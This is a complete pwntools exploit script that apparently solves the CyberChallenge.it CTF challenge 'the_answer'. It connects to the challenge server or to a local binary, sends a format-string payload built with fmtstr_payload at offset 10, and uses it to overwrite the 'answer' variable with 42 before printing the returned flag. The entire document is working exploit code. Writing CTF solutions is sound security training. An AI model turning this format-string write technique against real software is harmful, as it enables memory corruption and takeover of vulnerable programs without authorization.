from pwn import *

context.binary = elf = ELF('./the_answer')
if args.REMOTE:
    r = remote('answer.challs.cyberchallenge.it', 9122)
else:
    r = process(elf.path)

payload = fmtstr_payload(10, {elf.symbols['answer']: 42})
r.sendlineafter(b'name?\n', payload)

r.recvline()
print(r.recvline().strip().decode())